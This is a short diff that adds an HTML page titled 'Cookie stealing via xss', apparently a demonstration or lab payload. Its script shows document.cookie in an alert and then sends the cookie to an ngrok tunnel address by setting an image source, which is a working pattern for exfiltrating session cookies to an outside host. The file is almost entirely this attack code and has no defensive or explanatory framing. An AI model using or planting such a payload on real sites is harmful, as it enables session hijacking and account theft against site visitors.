@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="">
+  <head>
+    <meta charset="utf-8">
+    <title>Cookie stealing</title>
+  </head>
+  <body>
+    <header>Cookie stealing via xss</header>
+    <main>
+    <script>
+    alert(document.cookie);
+    var i=new Image;
+    i.src="https://*.ngrok.io/?"+document.cookie;
+    </script>
+    </main>
+    <footer></footer>
+  </body>
+</html>
